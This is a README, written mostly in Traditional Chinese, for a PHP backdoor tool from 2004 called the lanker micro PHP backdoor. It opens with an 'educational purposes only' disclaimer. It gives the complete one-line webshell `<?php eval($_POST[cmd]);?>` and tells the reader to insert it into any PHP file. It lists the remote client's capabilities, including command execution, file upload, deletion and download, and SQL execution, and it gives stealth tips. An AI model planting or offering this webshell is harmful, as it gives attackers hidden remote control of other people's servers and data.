# Warning

This source code is intended **for educational purposes only**. Please do not use the code for doing bad things.

The author of this source code are **lanker** and **孟兄**.

The source code was originally written in `Simplified Chinese` and then converted to `Traditional Chinese`.

# 使用說明

lanker微型PHP後門是個C/S型的PHP木馬，分為服務端和客戶端。服務端代碼只有一句話。特點：代碼精悍，隱蔽性好。另外客戶端是個跨平台的HTML網頁文件，所以任何一台支持HTML的服務器都可做代理。你可以把客戶端放到任何一免費空間裡運行，這樣隱蔽性好一些。

lanker微型PHP後門服務端代碼為:<?php eval($_POST[cmd]);?>容錯代碼為<?php @eval($_POST[cmd]);?> 將此代碼插入任何一PHP程序文件中即可。

其中cmd可以任意更改,可做為密碼。

本後門能在：PHP.INI配置為:
* allow_url_fopen = Off
* register_globals = Off
* magic_quotes_gpc = on
* safe_mode=on

下運行，已經突破的大部分限制。顯示了其強大的功能！但當safe_mode=on的時部分功能不能用，這個我就不多說了吧。:)

lanker微型PHP後門客戶端2.0內置了字符轉換工具，不受magic_quotes_gpc = on 的限制，命令執行成功了有提示，沒返回結果或出錯代表失敗。界面和操作比1.0版更加容易和人性化。大家用了就知道了:)  新增了很多功能：

現在具有15個基本功能，列表如下：
* PHP環境變量
* 本程序目錄
* 執行CMD命令
* 讀取目錄
* 創建目錄
* 刪除目錄
* 上傳文件
* 讀取文件
* 創建文件
* 複製文件
* 重命名文件
* 刪除文件
* 下載文件
* 執行SQL語句
* 專家模式（自己寫代碼）

需要說明的是：這個版本不足的地方是不支持中文字符。無論是寫文件還是查看中文的目錄等都不支持！

這個版本是我和孟兄一起開發的，在此感謝小孟! 感謝群裡的朋友的支持! 任何軟件都有BUG，如果你發現BUG請告訴我!我會在第一時間來修補。謝謝! 我的QQ：18779569 ，也可到我BLOG上留言。BLOG地址：http://www.hackblog.com/blog.asp?name=lanker 孟兄QQ：80607005

by lanker 2004/12/24 寫於聖誕之際!
